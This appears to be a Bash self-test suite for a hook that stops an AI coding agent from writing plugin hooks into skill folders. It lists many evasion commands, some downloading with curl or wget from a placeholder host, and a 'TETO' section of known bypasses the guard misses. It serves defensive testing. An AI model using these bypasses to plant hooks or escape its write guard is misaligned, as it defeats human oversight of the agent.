  _c acusa "> nu com cwd na skill"        Bash  "> hooks" "${p}/.claude/skills/onion"
  _c acusa "> nu depois de then"          Bash  "if true; then > ${H}; fi"
  _c acusa "> nu depois de do"            Bash  "for i in 1; do > ${H}; done"
  _c acusa "> nu depois de else"          Bash  "if true; then :; else > ${H}; fi"
  _c acusa "> nu depois de chave"         Bash  "{ > ${H}; }"
  _c acusa "> nu depois de !"             Bash  "! > ${H}"
  _c acusa "> nu em subshell"             Bash  "(> ${H})"
  _c acusa "> nu em crase"                Bash  "echo \`> ${H}\`"
  _c acusa "> nu em \$( )"                Bash  "echo \$(> ${H})"
  _c acusa "> nu depois de atribuição"    Bash  "A=1 > ${H}"
  _c acusa ">> nu depois de duas atribuições" Bash "A=1 B=2 >> ${H}"
  _c acusa "> nu depois de atribuição, cwd na skill" Bash "A=1 > hooks" "${p}/.claude/skills/x"
  _c acusa "> nu depois de case …)"       Bash  "case a in a) > ${H};; esac"
  _c acusa "> nu depois de time"          Bash  "time > ${H}"
  _c acusa "> nu depois de coproc"        Bash  "coproc > ${H}"
  _c acusa "for … done > alvo"            Bash  "for i in 1; do echo x; done > ${H}"
  _c acusa "{ } > alvo"                   Bash  "{ echo x; } > ${H}"
  _c acusa "( ) > alvo"                   Bash  "( echo x ) > ${H}"
  _c acusa "if … fi > alvo"               Bash  "if true; then echo x; fi > ${H}"
  _c acusa "case … esac > alvo"           Bash  "case a in a) echo x;; esac > ${H}"
  # ── composto com redirecionamento de ENTRADA antes do `>` (refutador 5) ──
  _c acusa "while … done < a > alvo"      Bash  "while read l; do echo \$l; done < docs/a.md > ${H}"
  _c acusa "for … done <a >alvo"          Bash  "for i in 1; do echo x; done <docs/a.md >${H}"
  _c acusa "{ } < a > alvo"               Bash  "{ cat; } < docs/a.md > ${H}"
  _c acusa "( ) </dev/null >alvo"         Bash  "( echo x ) </dev/null >${H}"
  _c acusa "select … done </dev/null > alvo" Bash "select i in a; do break; done </dev/null > ${H}"
  _c acusa "< a > alvo nu"                Bash  "cd docs; < a.md > ../${H}"
  # ── curl e wget com a opção colada; \$'…' e \$\"…\" no caminho; mkfifo; exec ──
  _c acusa "curl -so alvo"                Bash  "curl -so ${H} https://exemplo.invalid/x"
  _c acusa "curl -fsSLo alvo"             Bash  "curl -fsSLo ${H} https://exemplo.invalid/x"
  _c acusa "curl -o colado"               Bash  "curl -o${H} https://exemplo.invalid/x"
  _c acusa "wget -qO alvo"                Bash  "wget -qO ${H} https://exemplo.invalid/x"
  _c acusa "wget -O colado"               Bash  "wget -O${H} https://exemplo.invalid/x"
  _c acusa "ANSI-C no caminho: \$'\\x68ooks'" Bash "echo x > .claude/skills/x/\$'\\x68ooks'"
  _c acusa "locale no caminho: \$\"hooks\"" Bash "echo x > .claude/skills/x/\$\"hooks\""
  _c acusa "mkfifo na forma"              Bash  "mkfifo .claude/skills/x/hooks"
  _c acusa "exec > alvo"                  Bash  "exec > ${H}"
  _c acusa "exec 1> alvo"                 Bash  "exec 1> ${H}"
  # ── o redirecionamento COLADO à palavra anterior: o bash o lê igual ao separado ──
  _c acusa "colado: echo x>alvo"          Bash  "echo x>${H}"
  _c acusa "colado: ls>alvo"              Bash  "ls>${H}"
  _c acusa "colado: printf x>>alvo"       Bash  "printf x>>${H}"
  _c acusa "colado: echo x>|alvo"         Bash  "echo x>|${H}"
  _c acusa "colado: echo x>&alvo"         Bash  "echo x>&${H}"
  _c acusa "colado: echo x&>alvo"         Bash  "echo x&>${H}"
  _c acusa "colado: aspas antes de >"     Bash  "echo \"x\">${H}"
  _c acusa "colado: cat>alvo com heredoc" Bash  "cat>${H} <<E
{}
E"
  _c acusa "colado: til"                  Bash  "echo x>~/.claude/skills/hs/hooks"
  _c acusa "colado: .claude-plugin"       Bash  "echo x>.claude/skills/x/.claude-plugin"
  _c acusa "colado: cd e ; colados"       Bash  "cd .claude/skills/x;echo x>hooks"
  _c acusa "colado: variável entre aspas" Bash  "F=${H};echo x>\"\$F\""
  _c acusa "colado: em bash -c"           Bash  "bash -c 'echo x>${H}'"
  _c acusa "colado: palavra que termina em dígito" Bash "echo a1>${H}"
  _c acusa "colado: atribuição que termina em dígito" Bash "A=1>${H}"
  _c acusa "colado: depois de 2>&1"       Bash  "echo x 2>&1>${H}"
  _c acusa "colado: subshell"             Bash  "(echo x)>${H}"
  _c acusa "colado: aspa escapada não abre aspas" Bash "echo \\'a>${H}"
  _c acusa "colado: crase que fecha"      Bash  "echo \`echo x\`>${H}"
  _c acusa "colado: \$( ) que fecha"      Bash  "echo \"\$(echo x)\">${H}"
  _c acusa "colado: dentro de crase"      Bash  "echo \`echo x>${H}\`"
  _c acusa "colado: python com -> segue julgado pela árvore" Bash "python3 -c \"def f()->int: return 1
open('${H}','w')\""
  # ── chaves de sequência e chave literal antes da que expande ──
  _c acusa "chaves de sequência: {h..h}ooks" Bash "mkdir -p .claude/skills/x/{h..h}ooks"
  _c acusa "chaves de sequência com passo" Bash "mkdir -p .claude/skills/x/{g..i..1}ooks"
  _c acusa "chaves de sequência além do teto fecham" Bash "mkdir -p .claude/skills/x/{1..999}"
  _c acusa "chave literal antes da que expande" Bash "mkdir -p .claude/skills/{x}/{hooks,b}"
  # ── a raiz com `.git` que é link quebrado ──
  _c acusa ".git como link quebrado: Write" Write "${d}/gitlink/.claude/skills/y/hooks/h"
  _c acusa ".git como link quebrado: Bash" Bash "printf x > ${d}/gitlink/.claude/skills/y/hooks/h"
  _c acusa "chaves estouradas não abortam: cd e >" Bash "touch /tmp/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}; cd .claude/skills/x; echo x > hooks/h"
  _c acusa "chaves estouradas não abortam: link" Bash "touch /tmp/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}; echo x > docs/lnk-hooks/r"
  _c acusa "chaves estouradas não abortam: variável" Bash "mkdir -p /tmp/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}; N=hooks; touch .claude/skills/x/\$N/h"
  _c acusa "cd -- e >"                    Bash  "cd -- .claude/skills/x && echo x > hooks/h"
  _c acusa "cd -P e >"                    Bash  "cd -P .claude/skills/x && echo x > hooks/h"
  _c acusa "cd -L e >"                    Bash  "cd -L .claude/skills/x && echo x > hooks/h"
  _c acusa "cd -e e >"                    Bash  "cd -e .claude/skills/x && echo x > hooks/h"
  _c acusa "cd por variável para link"    Bash  "D=hk; cd \$D && echo x > h"
  _c acusa "cd -P para link"              Bash  "cd -P hk && echo x > h"
  _c acusa "cd -P até a pasta do link"    Bash  "cd -P docs && echo x > lnk-hooks/r"
  _c acusa "cd -P seguido até o link"     Bash  "cd docs && cd -P ../hk && echo x > h"
  _c acusa "cd -- seguido até o link"     Bash  "cd -- docs && cd ../hk && echo x > h"
  _c acusa "ln -s de um argumento: pasta chamada hooks" Bash "ln -s ../../../../fora/exth/hooks" "${p}/.claude/skills/onion"
  _c acusa "ln -sn de um argumento: pasta chamada hooks" Bash "ln -sn ../../../../fora/exth/hooks" "${p}/.claude/skills/onion"
  _c acusa "ln -s de um argumento depois de cd" Bash "cd .claude/skills/onion && ln -s ${d}/fora/exth/hooks"
  _c acusa "ln -s de um argumento: pasta com plugin, relativo" Bash "ln -s ../../../fora/ext" "${p}/.claude/skills"
  # ── o que não se analisa, com o sinal ──
  _c acusa "aspas não fechadas com o sinal, em outra linha" Bash "cat > /tmp/z <<< 'a
.claude/skills/x/hooks/h"
  _c acusa "aspas não fechadas na forma fria" Bash "cd .claude/skills/x && echo 'oops > hooks/h"
  _c acusa "php -r file_put_contents"     Bash  "php -r \"file_put_contents('${H}','x');\""
  # ── CALA: edição honesta, citação, leitura e remoção ──
  _c cala "Write fora de raiz: docs/x" Write "${p}/docs/x/.claude/skills/y/hooks/z"
  _c cala "Write fora de raiz: pasta solta" Write "${d}/solta/.claude/skills/y/hooks/z"
  _c cala "Write fora de raiz: .claude-plugin em pasta solta" Write "${d}/solta/.claude/skills/y/.claude-plugin/plugin.json"
  _c cala "Write fora de raiz: subpasta da casa" Write "${d}/home/sub/.claude/skills/y/hooks/z"
  _c cala "Bash fora de raiz: docs/x" Bash "mkdir -p docs/x/.claude/skills/y/hooks && printf x > docs/x/.claude/skills/y/hooks/z"
  _c cala "Bash fora de raiz: pasta solta" Bash "printf x > ${d}/solta/.claude/skills/y/hooks/z"
  _c cala "Bash fora de raiz: python" Bash "python3 -c \"open('${d}/solta/.claude/skills/y/hooks/z','w')\""
  _c cala "cp -r de pasta com plugin para pasta solta" Bash "cp -r ${d}/fora/ext ${d}/solta/.claude/skills/"
  _c cala "cp -r da pasta chamada hooks para pasta solta" Bash "cp -r ${d}/fora/exth/hooks ${d}/solta/.claude/skills/y/"
  _c cala "mv -t para pasta solta" Bash "mv -t ${d}/solta/.claude/skills/y/hooks /tmp/a"
  _c cala "mv -t para fora da skill"       Bash  "mv -t /tmp/q ${H}"
  _c cala "mv -ft para fora da skill"      Bash  "mv -ft /tmp/q ${H}"
  _c cala "mv --target-directory= para fora" Bash "mv --target-directory=/tmp/q ${H}"
  _c cala "ln -st para fora da skill"      Bash  "ln -st /tmp ${H}"
  _c cala "cp -ft para fora da skill"      Bash  "cp -ft /tmp ${H}"
  _c cala "mv -t em hooks fundo"           Bash  "mv -t .claude/skills/x/references/hooks /tmp/a"
  _c cala "mv --target-directory separado para fora" Bash "mv --target-directory /tmp/q ${H}"
  _c cala "rsync -t do plugin para fora"   Bash  "rsync -t ${H} /tmp/q"
  _c cala "cwd na skill: > a.md"           Bash  "echo x > a.md" "${p}/.claude/skills/onion"
  _c cala "cwd na skill: mkdir references" Bash  "mkdir references" "${p}/.claude/skills/x"
  _c cala "cwd na pasta hooks: leitura"    Bash  "ls -la" "${p}/.claude/skills/w/hooks"
  _c cala "cwd na pasta hooks: > para fora" Bash "echo x > ../../../../docs/a.md" "${p}/.claude/skills/w/hooks"
  _c cala "link: leitura"                  Bash  "cat docs-l"
  _c cala "palavra igual a um link noutra pasta" Bash "cd docs && echo x > docs-l"
  _c cala "Write em SKILL.md do alvo do link de skill" Write "${d}/fora/vazia/SKILL.md"
  _c cala "Write em hooks fundo do alvo do link de skill" Write "${d}/fora/vazia/references/hooks/a.md"
  _c cala "Bash em SKILL.md do alvo do link de skill" Bash "printf x > ${d}/fora/vazia/SKILL.md"
  _c cala "chaves sem a forma"             Bash  "mkdir -p .claude/skills/x/{refs,docs}"
  _c cala "chaves além do teto fora de skills" Bash "echo skills; mkdir -p docs/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}"
  _c cala "cp -r da pasta chamada hooks direto em skills: é o nome da skill" Bash "cp -r ${d}/fora/exth/hooks .claude/skills/"
  _c cala "cp -r da pasta chamada hooks para fundo" Bash "cp -r ${d}/fora/exth/hooks .claude/skills/a/b/"
  _c cala "cp -r do conteúdo da pasta chamada hooks" Bash "cp -r ${d}/fora/exth/hooks/. .claude/skills/onion/"
  _c cala "chaves estouradas não fecham a leitura" Bash "touch /tmp/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}; cat ${H}"
  _c cala "cwd na pasta hooks: >&2"        Bash  "echo x >&2" "${p}/.claude/skills/w/hooks"
  _c cala ">&- fecha o descritor"          Bash  "echo x >&-" "${p}/.claude/skills/w/hooks"
  _c cala "2>&1 antes de > fora"           Bash  "echo x 2>&1 >/tmp/z" "${p}/.claude/skills/w/hooks"
  _c cala "> nu fora da forma"             Bash  "> /tmp/z; echo ${H}"
  _c cala "> nu depois de do, fora da forma" Bash "for i in 1; do > /tmp/z; done; echo ${H}"
  _c cala "> nu depois de atribuição, fora da forma" Bash "A=1 > /tmp/z; echo ${H}"
  _c cala "then só citado antes de >"      Bash  "echo then > /tmp/z; echo ${H}"
  _c cala "> nu dentro de aspas"           Bash  "echo 'if true; then > ${H}; fi'"
  _c cala "colado: fd 2> fora"            Bash  "echo x 2>/tmp/z; echo ${H}"
  _c cala "colado: > fora"                Bash  "echo x>/tmp/z; echo ${H}"
  _c cala "colado: entre aspas simples"   Bash  "echo 'a>${H}'"
  _c cala "colado: entre aspas duplas"    Bash  "echo \"a->${H}\""
  _c cala "colado: barra invertida"       Bash  "echo a\\>${H}"
  _c cala "colado: git commit -m com seta" Bash "git commit -m \"a->${H}\""
  _c cala "colado: corpo de heredoc de documento" Bash "cat > docs/a.md <<'E'
x>${H}
E"
  _c cala "colado: cwd na pasta hooks, x>&2" Bash "echo x>&2" "${p}/.claude/skills/w/hooks"
  _c cala "colado: cwd na pasta hooks, x>&-" Bash "echo x>&-" "${p}/.claude/skills/w/hooks"
  _c cala "colado: cwd na pasta hooks, x2>&1" Bash "echo x 2>&1" "${p}/.claude/skills/w/hooks"
  _c cala "} > fora"                      Bash  "{ echo x; } > /tmp/z; echo ${H}"
  _c cala "done > fora"                   Bash  "for i in 1; do echo x; done > /tmp/z; echo ${H}"
  _c cala "chaves de sequência sem a forma" Bash "mkdir -p .claude/skills/x/{1..3}"
  _c cala "chaves de sequência inválida ficam literais" Bash "mkdir -p .claude/skills/x/{a..}hooks"
  _c cala "chaves de sequência mista ficam literais" Bash "mkdir -p .claude/skills/x/{h..1}ooks"
  _c cala "sequência além do teto fora de skills" Bash "echo skills; mkdir -p docs/{1..999}"
  _c cala "done < plugin > fora: ler não é escrever" Bash "while read l; do :; done < ${H} > /tmp/z"
  _c cala "curl -so fora"                 Bash  "curl -so /tmp/z https://exemplo.invalid/${H}"
  _c cala "curl -H colado com o no valor" Bash  "curl -sHo${H} -o /tmp/z https://exemplo.invalid"
  _c cala "curl -H colado não é destino"  Bash  "curl -sH 'X: .claude/skills/x/hooks' -o /tmp/z https://exemplo.invalid"
  _c cala "wget -qO- para a saída"        Bash  "wget -qO- https://exemplo.invalid/x; echo ${H}"
  _c cala "ANSI-C fora da forma"          Bash  "echo \$'a\\tb' > docs/a.md; echo ${H}"
  _c cala "locale fora da forma"          Bash  "echo \$\"a\" > docs/a.md; echo ${H}"
  _c cala "exec > fora"                   Bash  "exec > /tmp/z; echo ${H}"
  _c cala "mkfifo fora"                   Bash  "mkfifo /tmp/z; echo ${H}"
  _c cala "cd -P noutra pasta e >"         Bash  "cd -P docs && echo x > hooks"
  _c cala "ln -s de um argumento: pasta sem forma" Bash "ln -s ../../../../fora/vazia" "${p}/.claude/skills/onion"
  _c cala "cwd em .claude/hooks: >"        Bash  "echo x > a" "${p}/.claude/hooks"
  _c cala "cwd em worktree de agente: >"   Bash  "echo x > a" "${p}/.claude/worktrees/a"
  _c cala "&> fora"                        Bash  "echo x &> /tmp/z"
  _c cala "&> citado entre aspas"          Bash  "echo 'a &> ${H}'"
  _c cala ">| citado entre aspas"          Bash  "echo \"a >| ${H}\""
  _c cala "aspas não fechadas sem o sinal" Bash  "cp a /tmp/z; echo 'skills sem o outro pedaço"
  _c cala "php -r só lê"                   Bash  "php -r \"echo file_get_contents('${H}');\""
  _c cala "php -r grava fora, citando"     Bash  "php -r \"file_put_contents('/tmp/a','${H}');\""
  _c cala "Write em skills/onion/SKILL.md" Write "${p}/.claude/skills/onion/SKILL.md"
  _c cala "Edit em skills/onion/SKILL.md"  Edit  "${p}/.claude/skills/onion/SKILL.md"
  _c cala "Edit em .claude/hooks/x.sh"     Edit  "${p}/.claude/hooks/x.sh"
  _c cala "Edit em .claude/settings.json"  Edit  "${p}/.claude/settings.json"
  _c cala "Write em docs/a.md"             Write "${p}/docs/a.md"
  _c cala "Write em skill nomeada hooks"   Write "${p}/.claude/skills/hooks/SKILL.md"
  _c cala "Write em hooks fundo: references/hooks" Write "${p}/.claude/skills/x/references/hooks/a.md"
  _c cala "Write em hooks fundo: templates/src/hooks" Write "${p}/.claude/skills/x/templates/src/hooks/useX.ts"
  _c cala "Write aninhado skills/a/b (S3)" Write "${p}/.claude/skills/a/b/hooks/h.js"
  _c cala "Write em .claude-plugin fundo"  Write "${p}/.claude/skills/a/b/.claude-plugin/plugin.json"
  _c cala "Write em .claude-plugin direto em skills" Write "${p}/.claude/skills/.claude-plugin/plugin.json"
  _c cala "Write na casa em hooks fundo"   Write "${d}/home/.claude/skills/x/references/hooks/a.md"
  _c cala "Write na casa em SKILL.md"      Write "${d}/home/.claude/skills/x/SKILL.md"
  _c cala "Bash > em hooks fundo"          Bash  "printf x > .claude/skills/x/references/hooks/a.md"
  _c cala "Bash > em .claude-plugin fundo" Bash  "printf x > .claude/skills/a/b/.claude-plugin/plugin.json"
  _c cala "mkdir de hooks fundo"           Bash  "mkdir -p .claude/skills/x/templates/src/hooks"
  _c cala "cd em hooks fundo e >"          Bash  "cd .claude/skills/onion && mkdir -p templates/src/hooks && cd templates/src/hooks && printf x > a.ts"
  _c cala "python3 -c em hooks fundo"      Bash  "python3 -c \"open('.claude/skills/x/references/hooks/a.md','w').write('x')\""
  _c cala "node em hooks fundo"            Bash  "node -e \"require('fs').writeFileSync('.claude/skills/x/references/hooks/a.md','x')\""
  _c cala "eval com hooks fundo no texto"  Bash  "eval \"\$(cat /tmp/x) > .claude/skills/x/references/hooks/a.md\""
  _c cala "cp -r de pasta com plugin para dentro de skill existente" Bash "cp -r ${d}/fora/ext .claude/skills/onion/"
  _c cala "cp -t de pasta com plugin para dentro de skill existente" Bash "cp -r -t .claude/skills/onion ${d}/fora/ext"
  _c cala "cp -r de pasta com plugin para fundo" Bash "cp -r ${d}/fora/ext .claude/skills/a/b"
  _c cala "rsync de pasta com plugin para dentro de skill" Bash "rsync -a ${d}/fora/ext .claude/skills/nova/"
  _c cala "Write fora do projeto"          Write "${d}/fora/hooks/h.js"
  _c cala "Bash > em .claude/hooks/x.sh"   Bash  "printf x > .claude/hooks/x.sh"
  _c cala "Bash > em docs, com o caminho no corpo" Bash "cat > docs/a.md <<'E'
o plugin mora em ${P} e em ${H}
E"
  _c cala "echo que cita"                  Bash  "echo ${P} ${H}"
  _c cala "echo que cita, redirecionado para docs" Bash "echo ${P} >> docs/a.md"
  _c cala "grep"                           Bash  "grep -rn '.claude-plugin' .claude/skills docs"
  _c cala "git log"                        Bash  "git log --oneline -- ${H}"
  _c cala "git commit -m"                  Bash  "git commit -m 'veto em ${H}'"
  _c cala "git add"                        Bash  "git add ${H}"
  _c cala "leitura: cat"                   Bash  "cat ${H}"
  _c cala "leitura: ls"                    Bash  "ls -la .claude/skills/x/hooks"
  _c cala "leitura: find -name"            Bash  "find .claude/skills -path '*/hooks/*' -type f"
  _c cala "leitura: cp do plugin para fora" Bash "cp ${H} /tmp/copia.json"
  _c cala "leitura: python3 -c open sem modo" Bash "python3 -c \"print(open('${H}').read())\""
  _c cala "python3 -c que só cita, escrevendo noutro lugar" Bash "python3 -c \"open('docs/a.md','w').write('${H}')\""
  _c cala "python3 heredoc que grava relatório citando" Bash "python3 - <<'EOF'
out = open('docs/a.md', 'w')
out.write('${H}')
EOF"
  _c cala "python3 heredoc com str.replace que cita .claude-plugin da raiz (replay)" Bash "python3 - <<'PY'
s = s.replace(old, 'docs/onion/federation-map.md .claude-plugin/marketplace.json')
PY"
  _c cala "python3 heredoc com str.replace que cita o caminho do alvo" Bash "python3 - <<'PY'
s = s.replace(old, '${H}')
PY"
  _c cala "python3 heredoc que grava .claude-plugin da raiz" Bash "python3 - <<'PY'
open('.claude-plugin/marketplace.json', 'w').write('x')
PY"
  _c cala "Write em .claude-plugin da raiz do repo" Write "${p}/.claude-plugin/marketplace.json"
  _c cala "Bash > em .claude-plugin da raiz do repo" Bash "printf x > .claude-plugin/marketplace.json"
  _c cala "heredoc de documento que traz um heredoc de python" Bash "cat > docs/a.md <<'E'
exemplo:
python3 - <<'PY'
open('${H}','w')
PY
fim
E"
  _c cala "git commit -F - com heredoc de python no corpo" Bash "git commit -F - <<'EOF'
fix: python3 - <<'PY'
open('${H}','w')
PY
EOF"
  _c cala "string em python que cita a chamada" Bash "python3 - <<'PY'
doc = \"\"\"use open('${H}','w') é vetado\"\"\"
print(doc)
PY"
  _c cala "python3 tool.py com heredoc de dado" Bash "python3 tool.py <<'E'
open('${H}','w')
E"
  _c cala "python3 -c com string que cita" Bash "python3 -c \"print(\\\"open('${H}','w')\\\")\""
  _c cala "atribuição dentro de doc não vira destino" Bash "cat > docs/a.md <<'E'
OUT=${H}
E
echo x > \"\$OUT\""
  _c cala "atribuição citada num echo não vira destino" Bash "echo 'veja OUT=${H} aqui'; echo x > \"\$OUT\""
  _c cala "valores distintos: escrita antes de reatribuir" Bash "out=/tmp/a; echo x > \"\$out\"; out=${H}; cat \"\$out\""
  _c cala "valores distintos: ramo de if" Bash "T=/tmp; f=\"\$T/a\"; if [ -d docs ]; then f=docs/a.md; else f=${H}; fi; echo x > \"\$f\""
  _c cala "for religa o nome"              Bash  "f=${H}; cat \"\$f\"; for f in docs/a.md; do echo x > \"\$f\"; done"
  _c cala "local na função religa o nome"  Bash  "f=${H}; w() { local f=\"\$1\"; echo x > \"\$f\"; }; w docs/a.md; cat \"\$f\""
  _c cala "mktemp segue dinâmico"          Bash  "d=\$(mktemp -d); mkdir -p \"\$d/.claude/skills/x/hooks\"; echo x > \"\$d/.claude/skills/x/hooks/h\""
  _c cala "cd no plugin, cd -, e escreve fora" Bash "cd .claude/skills/x/hooks && ls; cd -; echo x > report.md"
  _c cala "OLD=\$PWD, cd, volta e escreve fora" Bash "OLD=\$PWD; cd .claude/skills/x/hooks && ls; cd \"\$OLD\"; echo x > report.md"
  _c cala "pushd, popd e escreve fora"     Bash  "pushd .claude/skills/x/hooks; ls; popd; echo x > report.md"
  _c cala "Write em node_modules de skill" Write "${p}/.claude/skills/x/node_modules/lib/hooks/i.js"
  _c cala "Write em .git de skill"         Write "${p}/.claude/skills/x/.git/hooks/pre-commit"
  _c cala "Bash > em node_modules de skill" Bash "printf x > .claude/skills/x/node_modules/lib/hooks/i.js"
  _c cala "bash -n de script solto"        Bash  "bash -n docs/sbx.sh"
  _c cala "script solto cuja escrita não se prova" Bash "bash scratch/desloca.sh"
  _c cala "source de arquivo de segredos: o juiz não abre" Bash "set -a; source .env; set +a"
  _c cala "leitura: python3 shutil.copy para fora" Bash "python3 -c \"import shutil; shutil.copy('${H}','/tmp/a')\""
  _c cala "leitura: node copyFileSync para fora" Bash "node -e \"require('fs').copyFileSync('${H}','/tmp/a')\""
  _c cala "leitura: xargs cp -I para fora" Bash "grep -l foo .claude/skills/x/hooks/* | xargs -I{} cp {} /tmp/"
  _c cala "leitura: xargs cp -t para fora" Bash "grep -l foo .claude/skills/x/hooks/* | xargs cp -t /tmp/"
  _c cala "leitura: find -exec cp para fora" Bash "find .claude/skills/x/hooks -type f -exec cp {} /tmp/ \\;"
  _c cala "leitura: touch -r"              Bash  "touch -r ${H} /tmp/z"
  _c cala "leitura: tar -xO"               Bash  "tar -xOf /tmp/a.tar -C .claude/skills/x/hooks"
  _c cala "leitura: rsync -n"              Bash  "rsync -an ${d}/fora/ext/ .claude/skills/x/hooks/"
  _c cala "ln -s de um argumento cria o link no cwd" Bash "cd /tmp && ln -s ${p}/.claude/skills/x/hooks"
  _c cala "rsync que exclui as pastas de plugin" Bash "rsync -a --exclude hooks/ --exclude .claude-plugin/ ${d}/fora/ext/ .claude/skills/nova/"
  _c cala "ssh: outra máquina"             Bash  "ssh host 'grep foo ${H} > /tmp/o'"
  _c cala "scp: outra máquina"             Bash  "scp /tmp/f u@host:${p}/${H}"
  _c cala "rsync: outra máquina"           Bash  "rsync -a /tmp/f u@host:${p}/${H}"
  _c cala "remoção: find -exec rm"         Bash  "find .claude/skills/x/hooks -type f -exec rm {} +"
  _c cala "remoção: git -C clean"          Bash  "git -C .claude/skills/x/hooks clean -fd"
  _c cala "quarentena: os.rename para fora" Bash "python3 -c \"import os; os.rename('${H}','/tmp/q')\""
  _c cala "quarentena: shutil.move para fora" Bash "python3 -c \"import shutil; shutil.move('.claude/skills/x/hooks','/tmp/q')\""
  _c cala "remoção: rm"                    Bash  "rm -f ${H}"
  _c cala "remoção: rm -rf da pasta"       Bash  "rm -rf .claude/skills/x/hooks"
  _c cala "remoção: find -delete"          Bash  "find .claude/skills/x/hooks -type f -delete"
  _c cala "quarentena: mv do plugin para fora" Bash "mv .claude/skills/x/hooks /tmp/quarentena"
  _c cala "cp -r de pasta sem plugin para skills" Bash "cp -r ${d}/fora/vazia .claude/skills/nova"
  _c cala "crontab que cita: relógio não é desta guarda" Bash "crontab /tmp/tab; echo ${H}"
  _c cala "Bash > em skill nomeada hooks"  Bash  "printf x > .claude/skills/hooks/SKILL.md"
  _c cala "script solto que só cita"       Bash  "bash scratch/cita.sh"
  # ── TETO: não coberto, DECLARADO. Se um destes passar a barrar, o teto mudou e o cabeçalho tem de mudar junto ──
  _c TETO "script versionado (fronteira do juiz)" Bash "bash tools/w.sh"
  _c TETO "python3 x.py"                   Bash  "python3 scratch/qualquer.py"
  _c TETO "python3 com import por alias"   Bash  "python3 -c \"import shutil as s; s.copy('/tmp/a','${H}')\""
  _c TETO "python3 com variável reatribuída" Bash "python3 -c \"p='a'
p='${H}'
open(p,'w')\""
  _c TETO "git clone para dentro"          Bash  "git clone https://exemplo.invalid/r .claude/skills/x"
  _c TETO "git checkout de caminho"        Bash  "git checkout HEAD -- ${H}"
  _c TETO "glob no destino, sobre a pasta" Bash  "printf x > .claude/skills/x/ho*/h"
  _c TETO "chaves no destino"              Bash  "cp /tmp/a .claude/skills/x/{hooks,y}/h"
  _c TETO "awk print > literal"            Bash  "awk 'BEGIN{print \"x\" > \"${H}\"}'"
  _c TETO "perl -i"                        Bash  "perl -pi -e s/a/b/ ${H}"
  _c TETO "truncate sobre link"            Bash  "truncate -s0 docs-l"
  _c TETO "env -C sobre link"              Bash  "env -C hk sh -c 'true'"
  _c TETO "link por glob"                  Bash  "echo x > docs-?"
  _c TETO "cd por variável até a pasta do link" Bash "D=docs; cd \$D && echo x > lnk-hooks/r"
  _c TETO "chaves em curl -o"              Bash  "curl -sS -o .claude/skills/x/{hooks,y}/h https://exemplo.invalid/x"
  _c TETO "<> alvo"                        Bash  "cat <> ${H}"
  _c TETO "tar -c com o arquivo na forma"  Bash  "tar -cf ${H} docs"
  _c TETO "tar --create --file= na forma"  Bash  "tar --create --file=${H} docs"
  _c TETO "git -C … init na forma"         Bash  "git -C .claude/skills/x init -q hooks"
  # SOBREACUSA declarada: texto lido pelo tee via <<<, e vírgula escapada nas chaves (o shlex come a barra antes do juiz)
  _c acusa "SOBREACUSA (teto): tee com <<< que cita" Bash "tee docs/o <<< \".claude/skills/x/hooks\""
  _c acusa "SOBREACUSA (teto): vírgula escapada nas chaves" Bash "mkdir -p .claude/skills/x/{hooks\\,y,z}"
  _c acusa "exec 3> alvo"                  Bash  "exec 3> ${H}"
  _c TETO "pasta criada e copiada na mesma string" Bash "mkdir -p /tmp/q/hooks; cp -r /tmp/q .claude/skills/q"
  _c TETO "\$CLAUDE_CONFIG_DIR, que a varredura também não conhece" Bash "printf x > \"\$CLAUDE_CONFIG_DIR/skills/x/hooks/h\""
  # ── TETO COM RESULTADO: o veto não vê, a escrita acontece de verdade numa cópia, e a VARREDURA tem de acusar ──
  _tv() {  # _tv <nome> <comando rodado na raiz da cópia>
    local name="$1" cmd="$2" r rc=0 o
    case "${name}" in *"${PW_SELFTEST_ONLY:-}"*) : ;; *) return 0 ;; esac
    tvn=$((${tvn:-0} + 1)); r="${d}/tv${tvn}"
    mkdir -p "${r}/.claude/skills/x/hooks" "${r}/src/hooks" "${r}/docs" "${r}/.claude/skills/old/hooks"
    git -C "${r}" init -q -b feat
    echo x > "${r}/src/hooks/h.json"; echo x > "${r}/docs/a"; echo x > "${r}/.claude/skills/old/hooks/h"
    printf "open('.claude/skills/x/hooks/h','w').write('x')\n" > "${r}/w.py"
    git -C "${r}" add -A; git -C "${r}" -c user.email=t@t -c user.name=t commit -q -m a
    git -C "${r}" rm -q -r .claude/skills/old; git -C "${r}" -c user.email=t@t -c user.name=t commit -q -m b
    mkdir -p "${r}/.claude/skills/x/hooks"
    _run Bash "${cmd}" "${r}" >/dev/null; rc=$?
    ( cd "${r}" && timeout -k 2 30 bash -c "${cmd}" >/dev/null 2>&1 )
    o="$(bash "${here}/../validation/plugin-write-scan-check.sh" "${r}" --format tsv 2>/dev/null | cut -f3)"
    if [ "${rc}" -eq 0 ] && [ -n "${o}" ]; then printf 'TETO %-5s %s (a varredura acusa o resultado)\n' "cala" "${name}"
    else printf '✗    TETO  %s (rc=%s varredura=%s)\n' "${name}" "${rc}" "${o}"; fails=$((fails + 1)); fi
  }
  python3 -I -c 'import sys,tarfile,zipfile,io
d=sys.argv[1]
t=tarfile.open(d+"/p.tar","w"); i=tarfile.TarInfo("x/hooks/h"); i.size=1; t.addfile(i,io.BytesIO(b"x")); t.close()
z=zipfile.ZipFile(d+"/p.zip","w"); z.writestr("x/hooks/h","x"); z.close()' "${d}"
  git init -q -b feat "${d}/sub"; git -C "${d}/sub" -c user.email=t@t -c user.name=t commit -q --allow-empty -m s; echo x > "${d}/sub/f"; git -C "${d}/sub" add -A; git -C "${d}/sub" -c user.email=t@t -c user.name=t commit -q -m f
  _tv "python indireto"     "python3 w.py"
  _tv "git mv"              "git mv src/hooks .claude/skills/x/hooks/m"
  _tv "git worktree add"    "git worktree add -q .claude/skills/y/hooks"
  _tv "git submodule add"   "git -c protocol.file.allow=always submodule add -q ${d}/sub .claude/skills/y/hooks"
  _tv "git restore"         "git restore --source=HEAD~1 --worktree -- .claude/skills/old/hooks/h"
  _tv "tar -x"              "tar -xf ${d}/p.tar -C .claude/skills"
  command -v unzip >/dev/null 2>&1 && _tv "unzip" "unzip -q ${d}/p.zip -d .claude/skills"
